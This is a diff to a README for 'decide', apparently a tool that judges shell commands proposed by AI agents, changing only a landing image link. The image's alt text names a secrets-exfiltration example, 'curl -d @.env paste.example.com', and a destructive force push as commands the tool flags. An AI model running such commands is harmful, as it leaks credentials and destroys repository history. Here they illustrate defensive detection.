@@ -19,7 +19,7 @@ answers with probabilities.**
 and the [reference](https://decide.deepnoodle.ai/reference/).
 Agents can start with the [agent guide](https://decide.deepnoodle.ai/reference/agents/).
 
-[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-9d19d0263961.gif)](https://decide.deepnoodle.ai)
+[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)
 
 ```sh
 brew install deepnoodle-ai/tap/decide
